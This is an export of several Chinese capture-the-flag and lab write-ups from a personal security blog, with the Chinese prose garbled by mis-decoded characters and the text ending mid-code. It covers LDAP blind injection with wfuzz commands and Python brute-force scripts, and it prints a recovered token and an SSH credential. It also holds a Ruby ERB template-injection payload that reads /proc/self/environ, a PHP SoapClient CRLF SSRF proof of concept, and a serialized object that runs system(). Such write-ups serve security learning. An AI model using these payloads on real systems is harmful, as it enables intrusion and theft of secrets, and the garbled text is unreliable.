Wordsï¼Œä½†æ˜¯åœ¨é¡µé¢æµ‹è¯•ä¸€ä¸‹ å‘ç°è¿”å›çš„è¿˜æ˜¯User + not foundæˆ–è€…User &amp; not foundï¼Œè¿™æ ·çš„è¯åº”è¯¥æ˜¯233 Wordsï¼Œè€Œä¸æ˜¯Wfuzzè¿”å›çš„232 Wordsã€‚ æˆ‘ä»¬å°è¯•æŠŠè¿™äº›ç‰¹æ®Šå­—ç¬¦äºŒæ¬¡URLç¼–ç ï¼Œçœ‹Webåº”ç”¨æ˜¯å¦è¿˜èƒ½è§£æï¼Œç”¨seclistsä¸­çš„doble_uri_hex.txtä½œä¸ºå­—å…¸ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php æœ€åFuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯ 12345%2500 ---&gt; %00%2528 ---&gt; (%2529 ---&gt; )%252a ---&gt; *%255c ---&gt; \\ è¿™äº›è¢«è¿‡æ»¤çš„å­—ç¬¦å°±æ˜¯LDAPæ³¨å…¥éœ€è¦è¿‡æ»¤çš„æ‰€æœ‰å­—ç¬¦ï¼Œå†ç»“åˆlogin.phpé¡µé¢æºä»£ç ä¸­çš„hintï¼Œå¯ä»¥ç¡®å®šæ˜¯LDAPæ³¨å…¥ã€‚ Getting User Access å…ˆæ¥çœ‹LDAPæ³¨å…¥çš„æœ€åŸºæœ¬å½¢å¼ 1234(&amp; (password&#x3D;1234) (uid&#x3D;ca01h%00)) å…·ä½“åˆ°è¿™ä¸ªé¶æœºçš„è¯ï¼Œæˆ‘ä»¬éœ€è¦çŒœè§£æ‹¬å·çš„ä¸ªæ•°ã€‚è¿ç”¨ç±»ä¼¼ç›²æ³¨çš„æ€æƒ³ï¼Œå¦‚æœæ³¨å…¥æˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›User ca01h not foundã€‚ å‡è®¾åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼š å‡è®¾æœ‰ä¸¤ä¸ªæ‹¬å·ï¼š å‡è®¾æœ‰ä¸‰ä¸ªæ‹¬å·ï¼š å½“å°è¯•åˆ°ä¸‰ä¸ªæ‹¬å·ç”¨äºé—­åˆæ—¶ï¼ŒæˆåŠŸè¿”å›äº†User ca01h%29%29%29%00 not foundï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•æ¡†çš„LDAPæŸ¥è¯¢çš„åŸºæœ¬å½¢å¼å°±æ˜¯ 123456789(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ca01h)))%00 ) (&amp;| (other comparing) )) æ¥ç€ï¼Œæˆ‘ä»¬å†å›å¤´å»çœ‹ä¸€ä¸‹Fuzzå‡ºæ¥çš„è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå…¶ä¸­%25%2aè¿”å›çš„æ¶ˆæ¯é•¿åº¦ä¸º231 Words å‘ç°å›æ˜¾çš„æ¶ˆæ¯æ˜¯Cannot loginï¼Œè¯´æ˜å¯ä»¥ç”¨*é€šé…ç¬¦æ¥ç›²æ³¨ç”¨æˆ·åï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3### username_burp.pyimport sysimport timefrom string import ascii_lowercasefrom urllib.parse import quote_plusimport requestsURL = &#x27;http://10.10.10.122/login.php&#x27;username, done = &#x27;&#x27;, Falseprint()while not done: for c in ascii_lowercase: payload = username + c + quote_plus(&#x27;*&#x27;) data = &#123; &#x27;inputUsername&#x27;: payload, &#x27;inputOTP&#x27;: &#x27;1234&#x27; &#125; resp = requests.post(URL, data=data) if &#x27;Cannot login&#x27; in resp.text: username += c break sys.stdout.write(f&#x27;\\r&#123;username&#125;&#123;c&#125;&#x27;) time.sleep(0.2) else: done = Trueprint(f&#x27;[+] Username: &#123;username&#125; \\n&#x27;) ç”¨æˆ·åä¸ºldapuser çŸ¥é“äº†ç”¨æˆ·åä¹‹åï¼Œæˆ‘ä»¬å°±è¦å»è·å–ç”ŸæˆOTPçš„81ä½tokenï¼Œé€šè¿‡é¡µé¢æºä»£ç çš„æç¤ºï¼Œè¿™ä¸ªtokenå­˜å‚¨åœ¨æŸä¸€ä¸ªLDAPé»˜è®¤å·²ç»å­˜åœ¨çš„å±æ€§å½“ä¸­ã€‚è€Œé»˜è®¤çš„å±æ€§å¯ä»¥åœ¨PayloadsAllTheThingsä¸­æ‰¾åˆ°ï¼š 123456789101112131415161718192021222324252627ccncocommonNamedcfacsimileTelephoneNumbergivenNamegnhomePhoneidjpegPhotolmailmobilenameoobjectClassouownerpagerpasswordsnstsurnameuidusernameuserPassword å¦‚æœä¸æƒ³å†™è„šæœ¬çš„è¯ç”¨wfuzzæ¥Fuzzé¶æœºçš„LDAPä¸­å­˜åœ¨çš„å±æ€§å¯èƒ½ä¼šæ›´å¿«ä¸€äº›ï¼Œä½†è¿˜æ˜¯è¦å…ˆæ‰¾åˆ°æ³¨å…¥çš„å½¢å¼ï¼š 12345678910(&amp; (&amp; (password&#x3D;1234) (uid&#x3D;ldapuser) (FUZZ&#x3D;*) ) (&amp;| (other comparing) )) æ­¤å¤–è¿˜è¦æŠŠæ³¨å…¥çš„å­—ç¬¦ldapuser)(FUZZ=*è¿›è¡ŒäºŒæ¬¡URLç¼–ç ï¼Œç¼–ç ä¹‹åçš„ç»“æœldapuser%2529%2528FUZZ%253d%252aã€‚ 1wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php æˆ‘ä»¬Fuzzå‡ºæ¥äº†è¿™ä¹ˆäº›å±æ€§æ˜¯å­˜åœ¨äºé¶æœºçš„LDAPæœåŠ¡ä¸­çš„ï¼Œç°åœ¨çš„å·¥ä½œå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„å±æ€§æ¥çŒœè§£ï¼Œå±äºä¸€äº›é‡å¤æ€§çš„å·¥ä½œï¼Œå°±ä¸åœ¨è¿™é‡Œè¿‡å¤šèµ˜è¿°äº†ï¼Œæœ€åå¯ä»¥æ‰¾åˆ°tokenæ˜¯å­˜å‚¨äºpagerå±æ€§ä¸­ã€‚æ¥ç€å†™è„šæœ¬ç”¨æ¥burp81ä½token 1234567891011121314151617181920212223242526272829#!/usr/bin/python3# pager_burp.pyimport requestsimport sysfrom time import sleepfrom string import digitstoken = &quot;&quot;URL = &quot;http://10.10.10.122/login.php&quot;attribute = &quot;pager&quot;loop = 1while loop &gt; 0: for digit in digits: token = token # ldapuser)(pager=&lt;token&gt;)* payload = f&quot;ldapuser%29%28&#123;attribute&#125;%3d&#123;token&#125;&#123;digit&#125;%2a&quot; data = &#123;&quot;inputUsername&quot;: payload, &quot;inputOTP&quot;: &quot;1234&quot;&#125; r = requests.post(URL, data=data) sys.stdout.write(f&quot;\\rToken: &#123;token&#125;&#123;digit&#125;&quot;) sleep(0.5) if b&quot;Cannot login&quot; in r.content: token += digit break elif digit == &quot;9&quot;: loop = 0 breakprint(f&#x27;[+] Token: &#123;token&#125; \\n&#x27;) è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯éœ€è¦åˆ æ‰æœ€åçš„ä¸€ä¸ª9ï¼Œæ‰€ä»¥æœ€åçš„tokenå°±æ˜¯ï¼š 1285449490011357156531651545652335570713167411445727140604172141456711102716717000 æ¥ç€ç”¨stokenå·¥å…·å¯¼å…¥token ç”ŸæˆOTP æˆåŠŸç™»å½•åï¼Œè·³è½¬åˆ°page.phpé¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ Damn itâ€¦æç¤ºæˆ‘ä»¬ldapuseræƒé™ä¸å¤Ÿä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š å¯¹groupå±æ€§è¿›è¡Œæ³¨å…¥ï¼Œå³æŠŠåé¢groupå±æ€§çš„filteræˆªæ–­ 12345678910(&amp; (&amp; (pager&#x3D;&lt;token&gt;) (uid&#x3D;ldapuser)))%00 ) (| (group&#x3D;root) (group&#x3D;adm) )) ä½¿ç”¨*é€šé…ç¬¦ä½œä¸ºç”¨æˆ·åç™»å½• è¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ç¬¬ä¸€ç§æ–¹æ¡ˆï¼Œpayloadç›´æ¥æ”¾åˆ°burpä¸­ 1ldapuser%2529%2529%2529%2500 å†å»æ‰§è¡Œlså‘½ä»¤ è¯»å–page.phpæ–‡ä»¶ï¼š SSHç™»å½•ï¼šfdapuser:e398e27d5c4ad45086fe431120932a01","tags":[{"name":"Webå®‰å…¨å­¦ä¹ ","slug":"Webå®‰å…¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"LDAP","slug":"LDAP","permalink":"http://ca0y1h.top/tags/LDAP/"}],"categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"Webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”RubyåŠGo","date":"2020-08-18T12:27:10.000Z","path":"Web_security/ctf_writeup/15.buuctfåˆ·é¢˜â€”â€”RubyåŠGo/","text":"SCTF2019 Flag Shop è€ƒç‚¹ JWTä¼ªé€  Ruby SSTI è§£é¢˜ è§£æ³•1 æ‰“å¼€é¶æœºï¼ŒæŸ¥çœ‹æºä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;h1 style=&quot;text-align: center&quot;&gt;Flag Shop&lt;/h1&gt;Your uid is &lt;b id=&quot;uid&quot;&gt;&lt;/b&gt;&lt;br /&gt;Your JinKela is &lt;b id=&quot;jkl&quot;&gt;&lt;/b&gt;&lt;br /&gt;Flag Price: &lt;b&gt;1000000000000000000000000000&lt;/b&gt;&lt;hr /&gt;&lt;button onclick=&quot;buyFlag()&quot; style=&quot;text-align: left&quot;&gt;buy flag&lt;/button&gt;&lt;button onclick=&quot;reset()&quot; style=&quot;text-align: center&quot;&gt;reset&lt;/button&gt;&lt;button onclick=&quot;work()&quot; style=&quot;text-align: right&quot;&gt;work&lt;/button&gt;&lt;script&gt; function buyFlag() &#123; fetch(&quot;/shop&quot;, &#123; method: &#x27;POST&#x27;, // or &#x27;PUT&#x27; headers: new Headers(&#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;) &#125;) .then(res =&gt; res.text()) .then(function (response) &#123; alert(response) &#125;) .catch(error =&gt;alert(error)) &#125; function reset() &#123; if(confirm(&quot;This will reset all Jinkelas , Are U Sure?&quot;))&#123; fetch(&quot;/api/auth&quot;); setTimeout(()=&gt;window.location.reload(),500); &#125; &#125; function work() &#123; fetch(&quot;/work?name=bot&amp;do=bot is working&quot;) .then(()=&gt;window.location.reload()); &#125; fetch(&quot;/api/info&quot;,&#123; redirect: &#x27;manual&#x27; &#125;) .then(function (res) &#123; if(res.ok)&#123; return res.json() &#125; else&#123; fetch(&quot;/api/auth&quot;) reject; &#125; &#125;) .then(res=&gt;&#123; var info = res; console.log(info); document.getElementById(&quot;uid&quot;).innerText = info.uid; document.getElementById(&quot;jkl&quot;).innerText = info.jkl; &#125;) .catch(error =&gt; setTimeout(()=&gt;window.location.reload(),500))&lt;/script&gt; auth ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ª jwt tokenã€‚ ç°åœ¨å°±éœ€è¦æ‰¾åˆ°secretã€‚æ‰«æç«™ç‚¹ï¼Œå‘ç°æœ‰filebak 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586require &#x27;sinatra&#x27;require &#x27;sinatra/cookies&#x27;require &#x27;sinatra/json&#x27;require &#x27;jwt&#x27;require &#x27;securerandom&#x27;require &#x27;erb&#x27;set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;) file.sync = true use Rack::CommonLogger, fileendget &quot;/&quot; do redirect &#x27;/shop&#x27;, 302endget &quot;/filebak&quot; do content_type :text erb IO.binread __FILE__endget &quot;/api/auth&quot; do payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125; auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = authendget &quot;/api/info&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do erb :shopendget &quot;/work&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; auth = auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result endendpost &quot;/shop&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;) else auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125; auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;) endenddef islogin if cookies[:auth].nil? then redirect to(&#x27;/shop&#x27;) endend é‡ç‚¹å…³æ³¨workè·¯ç”± 123456789101112131415161718get &quot;/work&quot; do islogin auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125; auth = auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27; cookies[:auth] = auth ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result endend å¯ä»¥çœ‹åˆ° /work é‚£é‡Œæœ‰ ERB æ¨¡æ¿ï¼Œè¿˜ç›´æ¥æŠŠå¯æ§å‚æ•° name æ‹¼è¿›å»äº†ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥ä¸€äº›æ„é€ è¿‡çš„å‚æ•°ï¼Œæ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚ä½†æ˜¯é™åˆ¶äº†payloadçš„é•¿åº¦ä¸º7ã€‚æ¯”å¦‚ name=&lt;%=1%&gt;ï¼Œå°±ä¼šå¾— 1ã€‚ ä¸€äº›å¸¸è§„çš„SSTIæ³¨å…¥ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œæœ€å¤šåªèƒ½ç”±ä¸¤ä¸ªå­—ç¬¦ï¼Œè‚¯å®šæ˜¯è¡Œä¸é€šçš„ã€‚ å¯¹ç…§ Ruby å…¨å±€å˜é‡è¡¨ ï¼Œä¸æ–­ fuzzï¼Œå‘ç°$æœ‰ä¸œè¥¿ 12345unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;) puts ENV[&quot;FLAG&quot;] endend å…¶åœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹å‰ä¹‹å‰æœ‰ä¸ªåŒ¹é…ï¼Œå°±æ˜¯è¿™é‡Œã€‚è¦æ˜¯ SECRET å‚æ•°å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡ŒåŒ¹é…ï¼Œç”¨ä¼ å…¥çš„è¿™ä¸ªå€¼å»å’Œ ENV[&quot;SECRET&quot;] åŒ¹é…ï¼ŒåŒ¹é…ä¸Šäº†å°±å¾€ç»ˆç«¯è¾“å‡º FLAGã€‚ç„¶åæˆ‘ä»¬ SECRET ä¸ä¼ è¯•è¯•ï¼Œè¿™æ ·æ‹¬å·é‡Œçš„åŒ¹é…å°±ä¸è¿›è¡Œï¼Œåªè¿›è¡Œæ‹¬å·å¤–çš„ ENV[&quot;SECRET&quot;] çš„åŒ¹é…ï¼Œå†ç”¨å…¨å±€å˜é‡ $ å°±å¯ä»¥è¯»å‡º ENV[&quot;SECRET&quot;] äº†ã€‚ è§£æ³•2 HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢ å…ˆä»‹ç»ä¸€ä¸ªtrick 1234$a = &quot;qwertyu&quot;$b = Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]puts &quot;$a: #&#123;$a[0,3]&#125;&quot;puts &quot;$b: #&#123;$b[0,3]&#125;&quot; è¾“å‡ºç»“æœ 12$a: qwe$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] $bå˜é‡åŸæœ¬æ˜¯æ•°ç»„ï¼Œä½†æ˜¯ç”±äºè¢«æ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥æ•°ç»„åšäº†ä¸€ä¸ªé»˜è®¤çš„ç±»å‹è½¬æ¢å˜æˆäº†[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] æœ‰äº†è¿™ä¸ªtrickï¼Œä¸Šé¢ä»£ç [0,7]ä»åŸæœ¬çš„é™åˆ¶7ä¸ªå­—ç¬¦çªç„¶å˜æˆäº†é™åˆ¶7ä¸ªæ•°ç»„é•¿åº¦ payload 1&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 éœ€è¦å¯¹doå‚æ•°urlencodeç¼–ç  å‚è€ƒ https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html https://evoa.me/archives/15/","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"Rubyå’ŒGo","slug":"CTF/Rubyå’ŒGo","permalink":"http://ca0y1h.top/categories/CTF/Ruby%E5%92%8CGo/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–","date":"2020-08-18T11:45:46.000Z","path":"Web_security/ctf_writeup/6.buuctfåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–/","text":"BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ– LCTF2018 Bestphpâ€™s revenge è¿™ç¯‡æ–‡ç« åˆ†æçš„å¾ˆåˆ°ä½ï¼šhttps://www.anquanke.com/post/id/164569#h2-5 è€ƒç‚¹ sessionååºåˆ—åŒ– Soapclient + ssrf CRLF è§£é¢˜ index.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123; $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; flag.php 12345678only localhost can get flag!session_start(); echo &#39;only localhost can get flag!&#39;; $flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; only localhost can get flag! æ€è·¯å¦‚ä¸‹ï¼š åˆ©ç”¨ç¬¬4è¡Œå›è°ƒå‡½æ•°æ¥è°ƒç”¨session_start()ç”¨äºè¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilazeï¼› æ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆä¸Šé¢çš„åºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ï¼Œå¹¶ä¸”æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åˆ©ç”¨äº†CRLFæ¼æ´å†™å…¥äº†æˆ‘ä»¬è§„å®šçš„seesion_idï¼› ç„¶åå†é€šè¿‡ç¬¬4è¡Œçš„å›è°ƒå‡½æ•°è°ƒç”¨extract()å‡½æ•°ç”¨äºå˜é‡è¦†ç›–ï¼Œè¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°call_user_funcï¼› åŒæ—¶æˆ‘ä»¬å¯ä»¥ä¼ å…¥name=SoapClientï¼Œé‚£ä¹ˆæœ€åcall_user_func($b, $a)å°±å˜æˆcall_user_func(array('SoapClient','welcome_to_the_lctf2018')),å³call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)ï¼Œç”±äºSoapClientç±»ä¸­æ²¡æœ‰welcome_to_the_lctf2018è¿™ä¸ªæ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•__call()ä»è€Œå‘é€è¯·æ±‚ã€‚ å‘é€è¯·æ±‚ä¹Ÿå°±æ˜¯å»è®¿é—®flag.phpï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸ºç¬¬äºŒæ­¥æˆ‘ä»¬è§„å®šçš„session_idçš„æ–‡ä»¶ä¸­ã€‚ å†ç”¨è¿™ä¸ªsessionè®¿é—®ä¸»é¡µï¼Œå°±ä¼švar_dumpsessionæ–‡ä»¶çš„å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…å«å­—æ®µåä¸ºflagçš„å€¼ã€‚ å…ˆæ„é€ POCï¼š 1234567&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;N0rth3ty\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo &#x27;|&#x27;.$payload; è¿™ä¸ªpocå°±æ˜¯åˆ©ç”¨crlfä¼ªé€ è¯·æ±‚å»è®¿é—®flag.phpå¹¶å°†ç»“æœä¿å­˜åœ¨cookieä¸ºPHPSESSID=tcjr6nadpk3md7jbgioa6elfk4çš„sessionä¸­ã€‚ å†æ³¨å…¥ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š æ¥ç€è§¦å‘SoapClientçš„__callæ–¹æ³•å‘é€è¯·æ±‚ï¼š æ›´æ”¹cookieè®¿é—®ï¼š åè®° è¿™é“é¢˜å¡äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œè¿˜æ˜¯ä¸€ä¸ªç­¾åˆ°é¢˜ã€‚ã€‚ã€‚ã€‚æœ‰ä¸€ä¸ªé—®é¢˜ä¸€ç›´å›°æ‰°æˆ‘ï¼Œå°±æ˜¯æŠŠPOCç”Ÿæˆçš„å­—ç¬¦ä¸²å†™åˆ°sessionæ–‡ä»¶åï¼Œä»–æ˜¯ä»€ä¹ˆæ—¶å€™æŠŠsessionçš„æ–‡ä»¶å†…å®¹ç»™ååºåˆ—åŒ–å‡ºæ¥äº†ã€‚åæ¥çœ‹äº†ä¸€ç¯‡æ–‡ç« æ‰çŸ¥é“ï¼š äºæ˜¯å°±ååºåˆ—åŒ–äº†ä¸€ä¸ªSoapClientçš„å®ä¾‹ï¼Œå†è°ƒç”¨__callå‡½æ•°çš„æ—¶å€™å°±ä¼šé€šè¿‡è¿™ä¸ªå®ä¾‹å‘é€è¯·æ±‚ã€‚ å¼ºç½‘æ¯2020é’é¾™ç»„ phpweb è€ƒç‚¹ PHPååºåˆ—åŒ– è§£é¢˜ æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç æœ‰ä¸¤ä¸ªéšè—è¾“å…¥æ¡† éšä¾¿è¾“å…¥æµ‹è¯•ï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™å›æ˜¾ï¼Œå‘ç°è¿™ä¸¤ä¸ªè¾“å…¥æ¡†æ˜¯call_user_funcå‡½æ•°çš„å‚æ•°ã€‚ å¹¶ä¸”åŸºæœ¬ä¸Šè¿‡æ»¤å±é™©å‡½æ•°ï¼Œç”¨file_get_contentsè¯»å–index.phpæºç ã€‚ 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125;?&gt; æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„__destructå‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‡½æ•°å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¸è¿‡æ²¡æœ‰è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ã€‚ ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åˆ©ç”¨gettimeå‡½æ•°ä¸­çš„call_user_funcå‡½æ•°ä¼ å…¥unserializeå‡½æ•°ï¼Œç”Ÿæˆå­—ç¬¦ä¸²ï¼š 12345678&lt;?phpclass Test&#123; var $p = &quot;cat /tmp/flagoefiu4r93&quot;; var $func = &quot;system&quot;;&#125;$t = new Test;$ut = serialize($t);echo $ut; ä¼ å…¥å‚æ•°unserializeå’ŒO:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;ã€‚ [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz TODO [å®‰æ´µæ¯ 2019] easy_serialize_php è€ƒç‚¹ ä»£ç å®¡è®¡ PHP ååºåˆ—åŒ–å¯¹è±¡é€ƒé€¸ è§£é¢˜ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return 